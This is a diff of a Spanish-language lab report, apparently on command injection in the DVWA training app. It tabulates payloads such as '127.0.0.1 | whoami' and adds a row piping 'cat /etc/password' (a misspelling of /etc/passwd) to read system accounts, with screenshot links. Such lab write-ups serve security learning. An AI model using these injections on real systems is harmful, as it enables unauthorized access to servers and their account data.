@@ -33,3 +33,14 @@ Se han validado los siguientes ataques para demostrar que, a pesar del filtrado 
 | whoami            | 127.0.0.1 \| whoami        | www-data                                       | Usuario con el que corre el servidor.                        |
 | pwd               | 127.0.0.1 \| pwd           | /var/www/html/DVWA/vulnerabilities/exec        | Ruta absoluta del directorio vulnerable.                     |
 | ls                | 127.0.0.1 \| ls            | help, index.php, source                        | Estructura interna de archivos del servidor.                 |
+| cat /etc/password                | 127.0.0.1 \| cat /etc/password            | Lista de usuarios                       | Extracción de cuentas dle sistema(root,bin,etc.).                 |
+
+
+<img width="588" height="284" alt="image" src="https://github.com/user-attachments/assets/c84a9aee-5530-46f0-8534-5e1687fbd79a" />
+
+<img width="588" height="284" alt="image" src="https://github.com/user-attachments/assets/88d8e362-bead-4a05-8b56-79a85a901d8d" />
+
+<img width="588" height="284" alt="image" src="https://github.com/user-attachments/assets/9f8f8d5e-b8c0-4cc5-9884-6a00f2d096d4" />
+
+<img width="678" height="553" alt="image" src="https://github.com/user-attachments/assets/2c93a09e-1fa1-4530-b79b-9528e5130572" />
+
